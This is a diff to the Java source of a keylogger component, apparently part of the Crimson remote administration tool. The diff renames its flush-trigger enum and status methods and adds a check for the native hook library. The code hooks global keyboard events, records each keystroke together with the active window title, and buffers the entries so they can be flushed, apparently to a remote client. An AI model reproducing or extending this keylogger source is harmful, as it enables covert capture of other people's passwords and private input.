@@ -32,7 +32,7 @@ import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.ClientStore;
 import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
-import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
+import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.storage.MemList;
 import com.subterranean_security.crimson.core.util.Native;
@@ -72,7 +72,7 @@ public final class Keylogger {
 	 * @throws HeadlessException
 	 * @throws NativeHookException
 	 */
-	public static void start(FLUSH_METHOD m, int value) throws HeadlessException, NativeHookException {
+	public static void start(Trigger m, int value) throws HeadlessException, NativeHookException {
 		if (GraphicsEnvironment.isHeadless()) {
 			throw new HeadlessException();
 		}
@@ -104,7 +104,7 @@ public final class Keylogger {
 
 						}
 						break;
-					case TIME:
+					case PERIODIC:
 						while (!Thread.currentThread().isInterrupted()) {
 							Thread.sleep(value * 1000);
 							flush();
@@ -162,8 +162,17 @@ public final class Keylogger {
 	 * 
 	 * @return true if keylogger is running
 	 */
-	public static boolean isLogging() {
+	public static boolean isOnline() {
 		return monitor == null ? false : (monitor.isAlive() && GlobalScreen.isNativeHookRegistered());
+	}
+
+	public static boolean isInstalled() {
+		try {
+			Class.forName("org.jnativehook.keyboard.NativeKeyListener");
+			return true;
+		} catch (Exception e) {
+			return false;
+		}
 	}
 
 	/**
@@ -190,10 +199,10 @@ public final class Keylogger {
 
 class NKL implements NativeKeyListener {
 
-	private FLUSH_METHOD method;
+	private Trigger trigger;
 
-	public NKL(FLUSH_METHOD m) {
-		this.method = m;
+	public NKL(Trigger m) {
+		this.trigger = m;
 	}
 
 	@Override
@@ -211,7 +220,7 @@ class NKL implements NativeKeyListener {
 			Keylogger.buffer.add(EV_KEvent.newBuilder().setDate(e.getWhen()).setTitle(windowTitle)
 					.setEvent((e.getModifiers() == 0 ? "" : "") + e.getKeyChar()).build());
 
-			if (method == FLUSH_METHOD.EVENT) {
+			if (trigger == Trigger.EVENT) {
 				// notify monitor thread
 				Keylogger.buffer.notifyAll();
 
